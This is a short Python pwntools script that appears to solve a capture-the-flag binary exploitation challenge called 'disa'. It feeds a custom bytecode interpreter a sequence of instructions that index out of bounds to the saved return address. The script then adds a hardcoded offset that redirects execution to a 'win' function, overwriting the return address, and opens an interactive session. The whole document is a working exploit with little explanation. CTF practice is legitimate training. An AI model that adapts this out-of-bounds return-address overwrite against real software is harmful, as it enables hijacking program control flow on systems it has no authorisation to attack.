from pwn import *

exe = ELF("./disa")

GDB_SCRIPT = """
b interpreter
b *interpreter+607
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    else:
        return remote("localhost", 5000)

def inst(r, instruction):
    print(f"=> {instruction}")
    r.sendline(instruction.encode())

def set_dat(r, num):
    # go to temp cell
    inst(r, "PUT 0")
    inst(r, "JMP")

    # zero it
    inst(r, "ST")

    # math
    while num > 0:
        sub = min(num, 4095)
        inst(r, f"PUT {sub}")
        inst(r, f"ADD")
        num = num - sub
    
    inst(r, "LD")

RET_ADDR_OFFSET = 0x7fffffffdd98 - 0x7fffffff9d70
RET_ADDR_IDX = RET_ADDR_OFFSET // 2
WIN_OFFSET = 0x555555555229 - 0x55555555553b

r = conn()

r.recvline()
r.recvline()

set_dat(r, RET_ADDR_IDX)
inst(r, "JMP")
inst(r, f"PUT {WIN_OFFSET}")
inst(r, "ADD")
inst(r, "END")

r.interactive()
